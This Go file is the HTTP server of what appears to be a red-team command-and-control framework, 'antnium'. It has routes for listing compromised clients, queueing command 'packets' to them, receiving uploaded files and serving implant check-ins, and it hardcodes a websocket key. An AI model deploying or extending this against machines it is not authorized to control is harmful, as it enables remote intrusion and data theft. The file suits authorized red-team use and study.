package server

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"strconv"

	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/model"
	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
	"github.com/rs/cors"
	log "github.com/sirupsen/logrus"
)

type HttpServer struct {
	serverManager *ServerManager
	Campaign      campaign.Campaign
	coder         model.Coder
	wsUpgrader    websocket.Upgrader
}

func MakeHttpServer(serverManager *ServerManager) HttpServer {
	u := HttpServer{
		serverManager: serverManager,
		Campaign:      *serverManager.Campaign,
		coder:         model.MakeCoder(serverManager.Campaign),
		wsUpgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool {
				return true
			},
		},
	}
	return u
}

func (s *HttpServer) getRandomPacketId() string {
	return strconv.Itoa(rand.Int())
}

func (s *HttpServer) Serve() {
	myRouter := mux.NewRouter().StrictSlash(true)

	// Admin Authenticated
	adminRouter := myRouter.PathPrefix("/admin").Subrouter()
	adminRouter.Use(GetAdminMiddleware(s.Campaign.AdminApiKey))
	adminRouter.HandleFunc("/packets", s.adminListPackets)
	adminRouter.HandleFunc("/packets/{computerId}", s.adminListPacketsComputerId)
	adminRouter.HandleFunc("/clients", s.adminListClients)
	//adminRouter.HandleFunc("/addTestPacket", s.adminAddTestPacket)
	adminRouter.HandleFunc("/addPacket", s.adminAddPacket)
	adminRouter.HandleFunc("/campaign", s.adminGetCampaign)
	adminRouter.HandleFunc("/uploads", s.adminGetUploads)
	adminRouter.HandleFunc("/statics", s.adminGetStatics)
	adminRouter.PathPrefix("/upload").Handler(http.StripPrefix("/admin/upload/",
		http.FileServer(http.Dir("./upload/"))))

	// While technically part of admin, the adminWebsocket cannot be authenticated
	// via HTTP headers. Make it public. Authenticate in the handler.
	myRouter.HandleFunc("/adminws", s.wsHandlerAdmin)

	// Client Authenticated
	clientRouter := myRouter.PathPrefix("/").Subrouter()
	clientRouter.Use(GetClientMiddleware(s.Campaign.ApiKey))
	clientRouter.HandleFunc(s.Campaign.PacketGetPath+"{computerId}", s.getPacket) // /getPacket/{computerId}
	clientRouter.HandleFunc(s.Campaign.PacketSendPath, s.sendPacket)              // /sendPacket
	myRouter.HandleFunc("/ws", s.wsHandlerClient)

	// Authentication only via packetId parameter
	myRouter.HandleFunc(s.Campaign.FileUploadPath+"{packetId}", s.uploadFile) // /upload/{packetId}
	// Authentication based on known filenames
	myRouter.PathPrefix(s.Campaign.FileDownloadPath).Handler(
		http.StripPrefix(s.Campaign.FileDownloadPath, http.FileServer(http.Dir("./static/")))) // /static
	// Authentication based on its a random directory name
	myRouter.PathPrefix("/webui").Handler(
		http.StripPrefix("/webui", http.FileServer(http.Dir("./webui/")))) // /static

	// Allow CORS
	c := cors.New(cors.Options{
		AllowedOrigins:   []string{"http://localhost:4200", "http://localhost:8080", s.Campaign.ServerUrl},
		AllowedHeaders:   []string{"Authorization"},
		AllowCredentials: true,
	})
	myRouter.Use(loggingMiddleware)
	handler := c.Handler(myRouter)

	fmt.Println("Starting webserver on " + s.serverManager.srvaddr)
	log.Fatal(http.ListenAndServe(s.serverManager.srvaddr, handler))
}

// wsHandler is the entry point for new admin/UI websocket connections
func (s *HttpServer) wsHandlerAdmin(w http.ResponseWriter, r *http.Request) {
	ws, err := s.wsUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Errorf("AdminWebsocket: %s", err.Error())
		return
	}

	// WebSocket Authentication
	// first message should be the AdminApiKey
	var authToken AuthToken
	_, message, err := ws.ReadMessage()
	if err != nil {
		log.Error("AdminWebsocket read error")
		return
	}
	err = json.Unmarshal(message, &authToken)
	if err != nil {
		log.Warnf("AdminWebsocket: could not decode auth: %v", message)
		return
	}
	if string(authToken) == s.Campaign.AdminApiKey {
		s.serverManager.AdminRegisterWs(ws)
	} else {
		log.Warn("AdminWebsocket: incorrect key: " + authToken)
	}
}

// wsHandler is the entry point for new websocket connections
func (s *HttpServer) wsHandlerClient(w http.ResponseWriter, r *http.Request) {
	ws, err := s.wsUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Errorf("ClientWebsocket: %s", err.Error())
		return
	}

	// WebSocket Authentication
	var authToken model.ClientWebSocketAuth
	_, message, err := ws.ReadMessage()
	if err != nil {
		log.Error("ClientWebsocket read error")
		return
	}
	err = json.Unmarshal(message, &authToken)
	if err != nil {
		log.Errorf("ClientWebsocket: could not decode auth: %v", message)
		return
	}
	if authToken.Key != "antnium" {
		log.Warn("ClientWebsocket: incorrect key: " + authToken.Key)
		return
	}

	s.serverManager.ClientRegisterWs(authToken.ComputerId, ws)
}

func loggingMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Do stuff here
		log.Debug(r.RequestURI)
		// Call the next handler, which can be another middleware in the chain, or the final handler.
		next.ServeHTTP(w, r)
	})
}

func GetClientMiddleware(key string) func(http.Handler) http.Handler {
	// Middleware function, which will be called for each request
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			token := r.Header.Get("X-Session-Token")
			if token == key {
				// Pass down the request to the next middleware (or final handler)
				next.ServeHTTP(w, r)
			} else {
				log.Info("Wrong key given: " + token)
				// Write an error and stop the handler chain
				http.NotFound(w, r)
			}
		})
	}
}

func GetAdminMiddleware(key string) func(http.Handler) http.Handler {
	// Middleware function, which will be called for each request
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			token := r.Header.Get("Authorization")
			if token == key {
				// Pass down the request to the next middleware (or final handler)
				next.ServeHTTP(w, r)
			} else {
				log.Infof("Wrong key given: %s for %s and %s", token, r.Method, r.URL)
				// Write an error and stop the handler chain
				http.NotFound(w, r)
			}
			//next.ServeHTTP(w, r)
		})
	}
}
